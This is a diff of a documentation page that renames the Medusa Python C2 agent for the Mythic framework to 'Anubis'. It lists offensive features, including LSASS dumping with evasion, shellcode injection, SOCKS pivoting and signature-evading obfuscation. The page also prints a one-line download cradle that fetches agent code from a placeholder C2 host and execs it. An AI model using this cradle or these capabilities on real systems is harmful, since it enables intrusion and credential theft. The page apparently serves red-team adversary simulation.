@@ -1,68 +1,86 @@
 +++
-title = "Medusa"
+title = "Anubis"
 chapter = false
 weight = 5
 +++
 
-![logo](/agents/medusa/medusa.svg?width=200px)
+![logo](/agents/anubis/Anubis.svg?width=200px)
+
 ## Summary
 
-Medusa is a cross-platform Python agent compatible with Python 2.7 and 3.8.
+Anubis is a cross-platform Python C2 agent for the Mythic framework, supporting Python 3.8 on Windows, Linux, and macOS. It implements AES-256-CBC + HMAC-SHA256 encrypted communications over HTTP, with optional XOR+Base64 obfuscation of the payload script at build time.
+
+Inspired by the Egyptian god of the dead and guardian of passages, Anubis operates discreetly between target and operator — establishing reliable C2 channels in Red Team and adversary simulation engagements.
 
 ### Highlighted Agent Features
 
-Python is an incredibly popular programming language and is often installed by default on many operating systems. Python 2.7, for example, is currently available on the latest macOS installs (though expected to be discontinued).
-Default libraries, such as `Cocoa` and `ctypes`, allow access to Objective-C APIs and functionality through Windows DLLs.
+- **Encrypted comms**: AES-256-CBC with HMAC-SHA256 integrity verification (pure Python stdlib implementation — no external crypto library required by default).
+- **Dynamic loading**: Commands can be loaded and unloaded at runtime via the C2 channel, limiting on-disk exposure.
+- **SOCKS5 proxy**: Full reverse SOCKS5 tunnel through the C2 channel for lateral movement and pivoting.
+- **Chunked file transfer**: Upload and download with configurable chunk size (default 51200 bytes), stoppable mid-transfer.
+- **Windows offensive capabilities**: LSASS fork dump (NtCreateProcessEx evasion), shellcode injection, DLL loading, process enumeration, screenshot capture (pure ctypes, no pywin32 or Pillow).
+- **Cloudflare tunnel support**: URL-safe base64 encoding for GET parameters; works through Cloudflare-proxied endpoints.
+- **Obfuscation**: Optional XOR + Base64 encoding of the entire agent script at build time.
+- **Jitter**: Symmetric sleep jitter to reduce predictable beacon intervals.
 
-The Medusa agent itself has several key features including:
-- Support for dynamic loading/unloading of functionality to limit exposure of agent capabilities on-disk. 
-- A SOCKS5 proxy compatible across Python 2.7 and 3.8, and across macOS, Windows and Linux.
-- Encrypted comms.
-- `Eval()` of Python code to dynamically extend functionality.
+With the ability to execute arbitrary code on the command line, a basic delivery cradle can be used:
 
-With the ability to execute arbitrary script on the command-line, a rudementary download cradle can be used, such as the below (notably, not proxy-aware):
-```
-python3 -c "import urllib.request; exec(urllib.request.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
-```
-
-Or for Python 2.7:
-```
-python -c "import urllib2;exec(urllib2.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
+```bash
+python3 -c "import urllib.request; exec(urllib.request.urlopen('https://[C2_HOST]/anubis.py').read())"
 ```
 
 ### Build Options
 
-This section provides details of what each Medusa-specific build option provides
-
 #### Python Version
-
-Pretty self-explanatory, select which version of Python the Medusa agent should be created for. See the Development section for details of how this works under the hood.
+Select Python 3.8 (recommended for Windows) or Python 2.7 (legacy macOS/Linux).
 
 #### Output Format
+- `py` — plain Python script
+- `base64` — Base64-encoded blob, suitable for one-liner delivery
 
-Mythic can provide the final agent code as a Python script, or as a Base64-encoded blob. Note that this is the last stage of the process effectively. So any XOR obfuscation, crypto library selection or Python version selection will take place before this.
-
-#### Cryptography library
-
-Medusa agents can be built using either a manual crypto implementation or using the non-default `cryptography` library. Given, the manual implementation isn't going to be as quick or efficient as the main Python library (not to mention the extra code required), `cryptography` use might be the way to go. Though do bear in mind, it is not a default library and appears to only be installed on macOS by default.
+#### Cryptography Library
+- `No` (default) — uses the built-in pure-Python AES implementation (no external dependencies required on target)
+- `Yes` — uses the `cryptography` pip library (faster, but requires the package to be installed on the target)
 
 {{% notice info %}}
- Either option here won't affect the agents ability to use encrypted comms, it is purely to specify how the encrypted comms are achieved.
+Either option provides full encrypted comms. The choice only affects the implementation method, not the security level.
 {{% /notice %}}
 
-#### XOR and Base64-encode
-
-Finally, the plaintext Medusa script can be encrypted via XOR with a randomly-generated key, before being Base64 encoded. This blob is then wrapped with an unpacker and put in a `exec()` function to ultimately run the Medusa agent. This is designed to make the agent less signaturable when on-disk. See the OPSEC section for more details.
+#### Obfuscate Script
+XOR-encrypts the agent with a random key and wraps it in a Base64+exec loader. Reduces static signature coverage.
 
 #### Verify HTTPS Certificate
+Set to `No` to skip TLS certificate verification (required when using self-signed certs or Cloudflare tunnels).
 
-By default, the web request libraries used in Medusa will fail when handling a self-signed certificate for HTTPS. This function introduces code to skip cert verification, so C2 can be established.
+### Installation
 
+```bash
+sudo ./mythic-cli install github https://github.com/wtechsec/Anubis.git
+```
 
 ### Important Notes
-Each job is executed in a new thread. Long-running jobs can be viewed with the `jobs` command and, where a 'stop' functionality has been implemented, they can be killed with `jobkill`.
+
+- Each task runs in a dedicated thread; long-running jobs are tracked with `jobs` and stopped with `jobkill`.
+- The agent re-attempts check-in automatically after consecutive C2 failures.
+- `dump_lsass` requires an elevated agent with SeDebugPrivilege. The command automatically attempts privilege escalation via `RtlAdjustPrivilege` and SYSTEM token impersonation as fallback.
+- `screenshot2` and `shinject` use pure `ctypes` — no external dependencies required on the target.
+
+---
+
+## Resumo em Português (PT-BR)
+
+Anubis é um agente C2 Python para o framework Mythic, com suporte a Python 3.8 em Windows, Linux e macOS. Implementa comunicação cifrada AES-256-CBC + HMAC-SHA256 sobre HTTP, com obfuscação opcional XOR+Base64 do script no build.
+
+### Funcionalidades principais
+
+- Comunicação cifrada sem dependências externas (AES puro em Python stdlib)
+- Carregamento dinâmico de comandos em runtime via canal C2
+- Proxy SOCKS5 reverso para pivoting e movimentação lateral
+- Transferência de arquivos em chunks, interrompível
+- Capacidades ofensivas Windows: dump LSASS por fork (evasão via NtCreateProcessEx), injeção de shellcode, carregamento de DLL, enumeração de processos, captura de tela (ctypes puro)
+- Suporte a tunnel Cloudflare
+- Jitter simétrico no beacon
 
 ## Authors
-@ajpc500
 
-
+- @wtechsec — Willian Oliveira / Escola Hack3r
